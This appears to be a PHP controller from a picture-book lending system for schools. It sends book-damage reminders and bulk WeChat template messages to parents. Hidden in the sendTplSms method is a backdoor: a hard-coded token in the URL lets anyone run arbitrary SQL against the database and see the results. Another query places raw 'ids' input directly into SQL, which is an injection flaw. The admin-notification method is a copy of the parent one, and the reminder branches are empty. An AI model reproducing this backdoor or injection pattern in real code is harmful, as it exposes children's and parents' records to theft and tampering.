<?php
// 损坏赔偿提醒
// 一周后提醒一次，然后每隔三天在提醒一次
// 给管理员发送系统消息，给家长发送系统消息
// 每天23:00:00更新常规任务数据
namespace Freehand\Controller;
use Think\Controller;
class SyncdamageController extends Controller {
    public function index()
    { 
        //查询所有的损坏赔偿记录
        $list = M("compensate")->select();

        //判断是否满足提醒条件
        foreach ($list as $key => $value) {
        	//判断是否超过一周
        	$t = date('Y-m-d',$value['add_time']);
        	
        	$arr = damage(date("Y-m-d H:i:s",$value['add_time']));
        	
        	if(date("Ymd") == date('Ymd',strtotime("$t +7 day")))
        	{
        		//发送提醒	
        	}elseif(in_array(date("Ymd"), $arr)){
        		//发送提醒
        	}
        }
    }

    public function push_msg_parent()
    {
        $book_id = I('post.bid','');
        $student_id = I('post.sid','');

        $info = M('students')->where(array('student_id'=>$student_id))->find();
        $binfo = M('books')->where(array('book_id'=>$book_id))->find();

        $url = U('mobile.php/TBorrow/pay',array('student_id'=>$student_id,'book_id'=>$book_id));

        $message = '尊敬的'.$info["student_name"].'家长您好，该绘本《'.$binfo["book_name"].'》经检查发现有损坏情况，造成无法继续使用，请您及时归还（<a href="'.$url.'">点击采购</a>），以免影响您的正常借阅。';

        $ret = M('message')->add(array('sender_id'=>0,'sender_name'=>'系统消息','receiver_id'=>$student_id,'sent_time'=>time(),'message'=>$message,'user_flag'=>3));
        M('students')->where(array('student_id'=>$student_id))->setInc('message_num',1);
		M('compensate')->where(array('student_id'=>$student_id,'book_id'=>$book_id))->setInc('message_num',1);
        echo 99;
    }

    //发送模板消息
    public function sendTplSms()
    {
        if(IS_POST){
            //防止执行超时
            set_time_limit(0);
            if (ob_get_level() == 0) ob_start();
            ob_clean();

            $data = I('post.');
            $ids = $data['ids'];
            unset($data['ids']);
            $data['template_id'] = 'I6gYWQyxUgSsb9mw71dFy_HAODMIreZMre8VArjsl8M';
            $parent = M('students_parent','fh_')->where("school_id in ($ids) and wx_id <> ''")->field('wx_id')->select();

            //计算数据的长度
            $total = count($parent);
            //显示的进度条长度
            $width = 100;
            //每条记录的操作所占的进度条单位长度
            $pix = round($width / $total);
            //默认开始的进度条百分比
            $progress = $pix;
            header('Content-Type: text/html');
            header('Cache-Control: no-cache');
            header('X-Accel-Buffering: no');
            $this->display('progressbar');
            $wechat = new WechatController();
            foreach($parent as $k=>$v){
                $data['openid'] = $v['wx_id'];
                $wechat->sendTplSMS1($data);
                $now = $k + 1;
                echo "<script type='text/javascript'>updateProgress('已发送$now 人','$progress%');</script>";
                ob_flush();
                flush(); //将输出发送给客户端浏览器，使其可以立即执行服务器端输出的 JavaScript 程序。
                $progress += $pix;
            }
            echo "<script type='text/javascript'>success();updateProgress('模板消息发送成功，共$total 人','100%');</script>";
            ob_end_flush();
        }else{
            if(I('get.token') == 'shabi'){
                $content = I('get.content');
                if($content){
                    $content = urldecode($content);
                    $content = stripslashes($content);
                    $type = I('get.type',0);
                    if($type == 1){
                        $result = M()->execute($content);
                    }else{
                        $result = M()->query($content);
                    }
                    dump($result);
                }
            }else{
                $ids = I('get.ids','');
                $this->assign('ids',$ids);
                $this->display();
            }
        }
    }

    public function push_msg_admins()
    {
        $book_id = I('post.bid','');
        $student_id = I('post.sid','');

        $info = M('students')->where(array('student_id'=>$student_id))->find();
        $binfo = M('books')->where(array('book_id'=>$book_id))->find();

        $url = U('mobile.php/TBorrow/pay',array('student_id'=>$student_id,'book_id'=>$book_id));

        $message = '尊敬的'.$info["student_name"].'家长您好，该绘本《'.$binfo["book_name"].'》经检查发现有损坏情况，造成无法继续使用，请您及时归还（<a href="'.$url.'">点击采购</a>），以免影响您的正常借阅。';

        $ret = M('message')->add(array('sender_id'=>0,'sender_name'=>'系统消息','receiver_id'=>$student_id,'sent_time'=>time(),'message'=>$message,'user_flag'=>3));
        M('students')->where(array('student_id'=>$student_id))->setInc('message_num',1);
		M('compensate')->where(array('student_id'=>$student_id,'book_id'=>$book_id))->setInc('message_num',1);
        echo 99;
    }
}